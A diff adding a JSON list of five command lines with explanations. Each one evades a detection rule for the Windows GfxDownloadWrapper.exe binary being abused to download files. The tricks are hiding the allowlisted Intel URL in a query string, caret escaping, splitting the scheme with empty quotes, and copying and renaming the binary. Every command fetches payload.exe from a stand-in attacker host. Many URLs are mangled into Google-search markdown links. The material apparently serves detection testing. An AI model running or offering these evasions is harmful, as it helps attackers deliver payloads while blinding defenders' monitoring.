@@ -1,0 +1,22 @@
+[
+  {
+    "output": "GfxDownloadWrapper.exe [https://gameplayapi.intel.com/index.html?url=http://malicious-domain.com/payload.exe](https://www.google.com/search?q=https://gameplayapi.intel.com/index.html%3Furl%3Dhttp://malicious-domain.com/payload.exe)",
+    "explanation": "The rule explicitly uses the 'filter_main_known_urls' logic to exclude commands containing the legitimate Intel endpoint string '[https://gameplayapi.intel.com/](https://gameplayapi.intel.com/)'. By passing a URL that targets the legitimate domain but embeds a query parameter or redirection pointing to the malicious destination, the filter condition evaluates to true and the alert is entirely suppressed."
+  },
+  {
+    "output": "cmd.exe /c \"GfxDownloadWrapper.exe h^t^t^p^s^:^/^/[malicious-domain.com/payload.exe](https://www.google.com/search?q=https://malicious-domain.com/payload.exe)\"",
+    "explanation": "The Windows command shell interprets the caret symbol (^) as an escape character. When executed through cmd.exe, the raw process creation logs capture the command line with the carets included, breaking the contiguous 'https://' or 'http://' substring matches required by the selection logic while allowing the internal binary to correctly parse the URL string at runtime."
+  },
+  {
+    "output": "GfxDownloadWrapper.exe \"http\"\"s://[malicious-domain.com/payload.exe](https://www.google.com/search?q=https://malicious-domain.com/payload.exe)\"",
+    "explanation": "By injecting empty double quotes inside the protocol schema string, the contiguous string signatures monitored by the SIEM logic are broken. The Windows command-line argument tokenizer strips these quotes during internal process initialization, maintaining functional execution while evading static string detection."
+  },
+  {
+    "output": "cmd.exe /c copy C:\\Windows\\System32\\GfxDownloadWrapper.exe C:\\Temp\\wrapper.exe && C:\\Temp\\wrapper.exe [https://malicious-domain.com/payload.exe](https://www.google.com/search?q=https://malicious-domain.com/payload.exe)",
+    "explanation": "The rule depends on a strict match where the process Image path must end with '\\GfxDownloadWrapper.exe'. Copying the binary to a temporary or staging directory under an arbitrary placeholder name nullifies the 'Image|endswith' constraint completely."
+  },
+  {
+    "output": "GfxDownloadWrapper.exe \"[https://attacker.com/payload.exe?bypass=https://gameplayapi.intel.com/](https://www.google.com/search?q=https://attacker.com/payload.exe%3Fbypass%3Dhttps://gameplayapi.intel.com/)\" \"C:\\Windows\\Temp\\payload.exe\"",
+    "explanation": "The rule uses a broad exclusion filter that ignores any execution where the command line contains '[https://gameplayapi.intel.com/](https://gameplayapi.intel.com/)'. By appending this exact string as a dummy URL parameter or fragment to a malicious URL, the attacker triggers the exclusion filter, causing the SIEM to ignore the event while the malicious file is still downloaded."
+  }
+]
